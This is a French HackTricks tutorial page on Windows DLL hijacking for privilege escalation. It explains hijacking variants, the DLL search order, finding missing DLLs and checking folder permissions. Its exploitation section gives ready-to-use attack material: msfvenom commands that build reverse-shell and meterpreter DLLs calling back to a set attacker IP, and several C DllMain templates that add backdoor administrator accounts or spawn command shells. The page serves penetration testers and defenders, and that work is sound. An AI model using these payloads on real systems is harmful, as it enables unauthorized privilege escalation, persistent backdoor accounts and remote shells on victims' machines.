# Dll Hijacking

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si vous êtes intéressé par une **carrière en piratage** et pirater l'impénétrable - **nous recrutons !** (_polonais courant écrit et parlé requis_).

{% embed url="https://www.stmcyber.com/careers" %}

## Définition

Tout d'abord, clarifions la définition. Le détournement de DLL est, au sens large, **tromper une application légitime/de confiance pour qu'elle charge une DLL arbitraire**. Des termes tels que _DLL Search Order Hijacking_, _DLL Load Order Hijacking_, _DLL Spoofing_, _DLL Injection_ et _DLL Side-Loading_ sont souvent - à tort - utilisés pour dire la même chose.

Le détournement de DLL peut être utilisé pour **exécuter** du code, obtenir de la **persistence** et **escalader des privilèges**. Parmi ces trois objectifs, le **moins probable** à trouver est de loin l'**escalade de privilèges**. Cependant, comme cela fait partie de la section sur l'escalade de privilèges, je me concentrerai sur cette option. Notez également que, indépendamment de l'objectif, un détournement de DLL est réalisé de la même manière.

### Types

Il existe une **variété d'approches** à choisir, dont le succès dépend de la manière dont l'application est configurée pour charger ses DLL requises. Les approches possibles incluent :

1. **Remplacement de DLL** : remplacer une DLL légitime par une DLL malveillante. Cela peut être combiné avec le _DLL Proxying_ \[[2](https://kevinalmansa.github.io/application%20security/DLL-Proxying/)], qui garantit que toutes les fonctionnalités de la DLL originale restent intactes.
2. **Détournement de l'ordre de recherche de DLL** : les DLL spécifiées par une application sans chemin sont recherchées dans des emplacements fixes dans un ordre spécifique \[[3](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)]. Le détournement de l'ordre de recherche se fait en plaçant la DLL malveillante dans un emplacement qui est recherché avant la DLL réelle. Cela inclut parfois le répertoire de travail de l'application cible.
3. **Détournement de DLL fantôme** : déposer une DLL malveillante à la place d'une DLL manquante/inexistante qu'une application légitime essaie de charger \[[4](http://www.hexacorn.com/blog/2013/12/08/beyond-good-ol-run-key-part-5/)].
4. **Redirection de DLL** : changer l'emplacement dans lequel la DLL est recherchée, par exemple en modifiant la variable d'environnement `%PATH%`, ou les fichiers `.exe.manifest` / `.exe.local` pour inclure le dossier contenant la DLL malveillante \[[5](https://docs.microsoft.com/en-gb/windows/win32/sbscs/application-manifests), [6](https://docs.microsoft.com/en-gb/windows/win32/dlls/dynamic-link-library-redirection)].
5. **Remplacement de DLL WinSxS** : remplacer la DLL légitime par la DLL malveillante dans le dossier WinSxS pertinent de la DLL ciblée. Souvent désigné comme le _DLL Side-Loading_ \[[7](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf)].
6. **Détournement de chemin relatif de DLL** : copier (et éventuellement renommer) l'application légitime dans un dossier accessible en écriture par l'utilisateur, aux côtés de la DLL malveillante. De la manière dont cela est utilisé, cela a des similitudes avec l'exécution de proxy binaire (signé) \[[8](https://attack.mitre.org/techniques/T1218/)]. Une variation de cela est (appelée quelque peu oxymoroniquement) '_apportez votre propre LOLbin_' \[[9](https://www.microsoft.com/security/blog/2019/09/26/bring-your-own-lolbin-multi-stage-fileless-nodersok-campaign-delivers-rare-node-js-based-malware/)] dans laquelle l'application légitime est apportée avec la DLL malveillante (plutôt que copiée de l'emplacement légitime sur la machine de la victime).

## Trouver les DLL manquantes

La manière la plus courante de trouver des DLL manquantes dans un système est d'exécuter [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) de sysinternals, en **définissant** les **deux filtres suivants** :

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

et en affichant uniquement l'**Activité du système de fichiers** :

![](<../../.gitbook/assets/image (314).png>)

Si vous recherchez des **dll manquantes en général**, vous **laissez** cela fonctionner pendant quelques **secondes**.\
Si vous recherchez une **dll manquante à l'intérieur d'un exécutable spécifique**, vous devez définir **un autre filtre comme "Nom du processus" "contient" "\<nom de l'exécutable>", l'exécuter et arrêter la capture d'événements**.

## Exploiter les DLL manquantes

Pour escalader les privilèges, la meilleure chance que nous avons est de pouvoir **écrire une dll qu'un processus privilégié essaiera de charger** dans un **endroit où elle sera recherchée**. Par conséquent, nous serons en mesure d'**écrire** une dll dans un **dossier** où la **dll est recherchée avant** le dossier où la **dll originale** se trouve (cas étrange), ou nous serons en mesure d'**écrire dans un dossier où la dll sera recherchée** et la dll originale **n'existe pas** dans aucun dossier.

### Ordre de recherche de DLL

**Dans la** [**documentation de Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching), **vous pouvez trouver comment les DLL sont chargées spécifiquement.**

En général, une **application Windows** utilisera des **chemins de recherche prédéfinis pour trouver les DLL** et vérifiera ces chemins dans un ordre spécifique. Le détournement de DLL se produit généralement en plaçant une DLL malveillante dans l'un de ces dossiers tout en s'assurant que cette DLL est trouvée avant la légitime. Ce problème peut être atténué en faisant en sorte que l'application spécifie des chemins absolus pour les DLL dont elle a besoin.

Vous pouvez voir l'**ordre de recherche de DLL sur les systèmes 32 bits** ci-dessous :

1. Le répertoire à partir duquel l'application a été chargée.
2. Le répertoire système. Utilisez la fonction [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) pour obtenir le chemin de ce répertoire. (_C:\Windows\System32_)
3. Le répertoire système 16 bits. Il n'existe aucune fonction qui obtient le chemin de ce répertoire, mais il est recherché. (_C:\Windows\System_)
4. Le répertoire Windows. Utilisez la fonction [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) pour obtenir le chemin de ce répertoire.
1. (_C:\Windows_)
5. Le répertoire courant.
6. Les répertoires qui sont listés dans la variable d'environnement PATH. Notez que cela n'inclut pas le chemin d'application par application spécifié par la clé de registre **App Paths**. La clé **App Paths** n'est pas utilisée lors du calcul du chemin de recherche de DLL.

C'est l'**ordre de recherche par défaut** avec **SafeDllSearchMode** activé. Lorsqu'il est désactivé, le répertoire courant passe en deuxième position. Pour désactiver cette fonctionnalité, créez la valeur de registre **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** et réglez-la sur 0 (activé par défaut).

Si la fonction [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) est appelée avec **LOAD\_WITH\_ALTERED\_SEARCH\_PATH**, la recherche commence dans le répertoire du module exécutable que **LoadLibraryEx** charge.

Enfin, notez qu'**une dll pourrait être chargée en indiquant le chemin absolu au lieu du nom**. Dans ce cas, cette dll est **uniquement recherchée dans ce chemin** (si la dll a des dépendances, elles seront recherchées comme si elles étaient chargées par leur nom).

Il existe d'autres moyens de modifier l'ordre de recherche, mais je ne vais pas les expliquer ici.

#### Exceptions à l'ordre de recherche de DLL d'après la documentation Windows

* Si une **DLL avec le même nom de module est déjà chargée en mémoire**, le système vérifie uniquement la redirection et un manifeste avant de résoudre à la DLL chargée, peu importe dans quel répertoire elle se trouve. **Le système ne recherche pas la DLL**.
* Si la DLL figure sur la liste des **DLL connues** pour la version de Windows sur laquelle l'application s'exécute, le **système utilise sa copie de la DLL connue** (et les DLL dépendantes de la DLL connue, le cas échéant) **au lieu de rechercher** la DLL. Pour une liste des DLL connues sur le système actuel, voir la clé de registre suivante : **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**.
* Si une **DLL a des dépendances**, le système **recherche** les DLL dépendantes comme si elles étaient chargées avec juste leurs **noms de module**. Cela est vrai **même si la première DLL a été chargée en spécifiant un chemin complet**.

### Escalader les privilèges

**Prérequis** :

* **Trouver un processus** qui s'exécute/sera exécuté avec **d'autres privilèges** (mouvement horizontal/lateral) qui **manque d'une dll**.
* Avoir des **droits d'écriture** sur n'importe quel **dossier** où la **dll** va être **recherchée** (probablement le répertoire exécutable ou un dossier à l'intérieur du chemin système).

Oui, les prérequis sont compliqués à trouver car **par défaut, il est plutôt rare de trouver un exécutable privilégié manquant d'une dll** et c'est encore **plus rare d'avoir des droits d'écriture sur un dossier de chemin système** (ce n'est pas possible par défaut). Mais, dans des environnements mal configurés, cela est possible.\
Dans le cas où vous avez de la chance et que vous vous trouvez dans les conditions requises, vous pourriez consulter le projet [UACME](https://github.com/hfiref0x/UACME). Même si l'**objectif principal du projet est de contourner l'UAC**, vous pourriez y trouver un **PoC** d'un détournement de DLL pour la version de Windows que vous pouvez utiliser (probablement juste en changeant le chemin du dossier où vous avez des droits d'écriture).

Notez que vous pouvez **vérifier vos permissions dans un dossier** en faisant :
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Et **vérifiez les permissions de tous les dossiers dans PATH** :
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Vous pouvez également vérifier les imports d'un exécutable et les exports d'une dll avec :
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Pour un guide complet sur la manière d'**abuser du Dll Hijacking pour escalader les privilèges** avec des permissions d'écriture dans un **dossier de chemin système**, consultez :

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Outils automatisés

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) vérifiera si vous avez des permissions d'écriture dans un dossier à l'intérieur du chemin système PATH.\
D'autres outils automatisés intéressants pour découvrir cette vulnérabilité sont les **fonctions PowerSploit** : _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ et _Write-HijackDll_.

### Exemple

Si vous trouvez un scénario exploitable, l'une des choses les plus importantes pour l'exploiter avec succès serait de **créer une dll qui exporte au moins toutes les fonctions que l'exécutable importera de celle-ci**. Notez cependant que le Dll Hijacking est pratique pour [escalader du niveau d'intégrité Moyen à Élevé **(contournant l'UAC)**](../authentication-credentials-uac-and-efs.md#uac) ou de [**Haute Intégrité à SYSTEM**](./#from-high-integrity-to-system)**.** Vous pouvez trouver un exemple de **comment créer une dll valide** dans cette étude sur le hijacking de dll axée sur le hijacking de dll pour l'exécution : [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
De plus, dans la **section suivante**, vous trouverez des **codes dll de base** qui pourraient être utiles comme **modèles** ou pour créer une **dll avec des fonctions non requises exportées**.

## **Création et compilation de Dlls**

### **Dll Proxifying**

En gros, un **Dll proxy** est une Dll capable d'**exécuter votre code malveillant lors du chargement** mais aussi d'**exposer** et de **fonctionner** comme **attendu** en **relayant tous les appels à la vraie bibliothèque**.

Avec l'outil [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ou [**Spartacus**](https://github.com/Accenture/Spartacus), vous pouvez en fait **indiquer un exécutable et sélectionner la bibliothèque** que vous souhaitez proxifier et **générer une dll proxifiée** ou **indiquer la Dll** et **générer une dll proxifiée**.

### **Meterpreter**

**Obtenir un shell inversé (x64) :**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtenez un meterpreter (x86) :**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Créer un utilisateur (x86, je n'ai pas vu de version x64) :**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Votre propre version

Notez que dans plusieurs cas, la Dll que vous compilez doit **exporter plusieurs fonctions** qui seront chargées par le processus victime. Si ces fonctions n'existent pas, le **binaire ne pourra pas les charger** et l'**exploitation échouera**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
```markdown
<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si vous êtes intéressé par une **carrière en hacking** et pirater l'impénétrable - **nous recrutons !** (_polonais courant écrit et parlé requis_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
```
